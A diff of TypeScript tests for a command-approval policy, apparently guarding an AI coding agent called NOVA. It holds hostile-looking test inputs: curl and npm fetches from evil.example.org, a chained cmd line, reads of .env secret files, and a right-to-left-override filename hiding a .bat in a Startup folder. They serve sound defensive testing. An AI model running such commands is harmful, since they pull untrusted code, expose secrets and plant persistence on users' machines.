@@ -177,23 +177,86 @@ describe('CommandPolicy – network', () => {
     expect(kindOf(p.evaluate('npm test'))).toBe('allow');
   });
 
-  it('asks for hosts that are not allowed and uses the host as subject', () => {
+  it('scopes a host approval to the host only when the line itself would run without asking', () => {
     const p = setup('win32');
+    // allow-listed line, only the host is unknown → an "always" rule may cover the host
+    const hostOnly = p.evaluate('npm install https://evil.example.org/paket.tgz');
+    expect(hostOnly).toMatchObject({ action: 'approve', kind: 'network', subject: 'evil.example.org' });
+    // unknown command + unknown host → the approval names the whole line (a host rule can never cover it)
     const d = p.evaluate('curl https://evil.example.org/data.json');
-    expect(d.action).toBe('approve');
-    if (d.action === 'approve') {
-      expect(d.kind).toBe('network');
-      expect(d.subject).toBe('evil.example.org');
-    }
+    expect(d).toMatchObject({ action: 'approve', kind: 'network', subject: 'curl https://evil.example.org/data.json' });
+    if (d.action === 'approve') expect(d.reason).toMatch(/evil\.example\.org.*Außerdem: .*nicht auf der Liste/);
+    // chained or nested lines with a URL are never host-scoped
+    expect(p.evaluate('cmd /c echo probe & echo https://evil.example.org/')).toMatchObject({ kind: 'network', subject: 'cmd /c echo probe & echo https://evil.example.org/' });
     // allowed host → falls through to the generic rules (curl is not allowlisted)
     const ok = p.evaluate('curl https://registry.npmjs.org/react');
     expect(kindOf(ok)).toBe('approve:command');
+  });
+
+  it('never host-scopes a line that runs a file NOVA wrote in this task', () => {
+    const p = setup('linux', ['tools/fetch.js']);
+    const d = p.evaluate('node tools/fetch.js https://evil.example.org/x');
+    expect(d).toMatchObject({ action: 'approve', kind: 'network', subject: 'node tools/fetch.js https://evil.example.org/x' });
+    if (d.action === 'approve') expect(d.consequences).toMatch(/in dieser Aufgabe geschrieben/);
   });
 
   it('respects wildcard entries in allowedHosts', () => {
     const p = setup('linux');
     t.core.settings.update({ network: { allowedHosts: ['*.example.org'] } });
     expect(kindOf(p.evaluate('curl https://api.example.org/x'))).toBe('approve:command');
+  });
+});
+
+describe('CommandPolicy – arguments of allow-listed commands', () => {
+  const cases: Array<[NodeJS.Platform, string, string]> = [
+    ['win32', 'git diff --no-index NUL ..\\anderes-projekt\\.env', 'approve:command'],
+    ['win32', 'git diff --no-index .env.example .env', 'approve:command'],
+    ['win32', 'git log --output=C:\\Users\\nutzer\\log.txt', 'approve:command'],
+    ['win32', 'npm install --prefix C:\\Users\\nutzer\\global', 'approve:outside_project'],
+    ['win32', 'npm install --prefix=C:\\Users\\nutzer\\global', 'approve:outside_project'],
+    ['win32', 'npx tsc --outDir ..\\anderes', 'approve:outside_project'],
+    ['win32', 'npx tsc --outDir \\Windows\\Temp', 'approve:outside_project'],
+    ['win32', 'dotnet build -o C:\\Users\\nutzer\\bin', 'approve:outside_project'],
+    ['win32', 'pytest --junitxml=C:\\Users\\nutzer\\x.xml', 'approve:outside_project'],
+    ['win32', 'npx tsc --outDir "C:\\Users\\nutzer\\NOVA Projekte\\spiel\\dist"', 'allow'],
+    ['win32', 'npx tsc --outDir dist', 'allow'],
+    ['win32', 'npm install https://registry.npmjs.org/react/-/react-19.0.0.tgz', 'allow'],
+    ['win32', 'git diff HEAD~1..HEAD', 'allow'],
+    ['win32', 'git diff src\\..\\..\\x', 'approve:outside_project'],
+    ['linux', 'npx tsc --outDir /tmp/x', 'approve:outside_project'],
+    ['linux', 'npx tsc --outDir ~/x', 'approve:outside_project'],
+    ['linux', 'git diff ../anderes', 'approve:outside_project'],
+    ['linux', 'git diff /home/nutzer/projekte/spiel/src', 'allow'],
+    ['linux', 'npm test -- --reporter=dot', 'allow'],
+  ];
+  it.each(cases)('%s: %s → %s', (platform, command, expected) => {
+    const p = setup(platform);
+    expect(kindOf(p.evaluate(command))).toBe(expected);
+  });
+
+  it('asks before an allow-listed command reads a protected file', () => {
+    t = createTestCore();
+    const s: Services = makeServices(t.core, {
+      pathGuard: {
+        resolve: (r: string, q: string) => ({ abs: posix.resolve(r, q), rel: posix.relative(r, posix.resolve(r, q)), key: posix.relative(r, posix.resolve(r, q)).toLowerCase() }),
+        isInside: () => true,
+        isProtected: () => false,
+        isSensitive: (rel: string) => /(^|\/)\.env$/.test(rel),
+      },
+      journal: { list: () => [] } as unknown as Services['journal'],
+      providers: { list: () => [] } as unknown as Services['providers'],
+    });
+    const policy = createCommandPolicy(s, { platform: 'linux' });
+    const d = policy.evaluate({ projectId: 'prj_1', projectRoot: '/home/nutzer/projekte/spiel', command: 'git diff .env', config, taskId: 'task_1' });
+    expect(d).toMatchObject({ action: 'approve', kind: 'command' });
+    if (d.action === 'approve') expect(d.reason).toMatch(/geschützte Datei/);
+  });
+
+  it('blocks invisible direction/zero-width characters that could fake the approval text', () => {
+    const p = setup('win32');
+    expect(kindOf(p.evaluate('copy bericht.txt C:\\Users\\nutzer\\Startup\\bericht\u202Efdp.bat'))).toBe('block');
+    expect(kindOf(p.evaluate('npm\u200B test'))).toBe('block');
+    expect(kindOf(p.evaluate('npm test'))).toBe('allow');
   });
 });
 
@@ -206,6 +269,16 @@ describe('CommandPolicy – taint rule', () => {
     expect(kindOf(p.evaluate('./build.sh'))).toBe('approve:command');
     // no task → no taint
     expect(kindOf(p.evaluate('node tools/run.js', null))).toBe('approve:command');
+  });
+
+  it('also catches calls without the file extension', () => {
+    const p = setup('win32', ['tools/run.cmd', 'evil.js', 'pkg/mod.py', 'app/index.js']);
+    t.core.settings.update({ permissions: { approveUnknownCommands: false } });
+    expect(kindOf(p.evaluate('node evil'))).toBe('approve:command');
+    expect(kindOf(p.evaluate('tools\\run'))).toBe('approve:command');
+    expect(kindOf(p.evaluate('python -m pkg.mod'))).toBe('approve:command');
+    expect(kindOf(p.evaluate('node app'))).toBe('approve:command');
+    expect(kindOf(p.evaluate('node other'))).toBe('allow');
   });
 
   it('allows allowlisted commands that do not run tainted files', () => {
